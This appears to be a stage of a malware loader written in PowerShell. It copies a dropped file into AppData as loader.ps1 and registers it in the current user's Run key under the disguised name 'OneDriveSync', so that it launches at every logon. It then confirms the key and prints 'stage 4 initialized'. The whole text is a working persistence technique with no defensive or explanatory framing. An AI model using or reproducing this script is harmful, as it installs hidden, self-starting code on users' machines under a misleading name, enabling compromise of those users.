Copy-Item -Path "$env:TEMP\update.dat" -Destination "$env:APPDATA\loader.ps1" -Force
reg.exe add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v 'OneDriveSync' /t REG_SZ /d "powershell.exe -NoP -File $env:APPDATA\loader.ps1" /f
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name 'OneDriveSync'
Write-Output "stage 4 initialized"
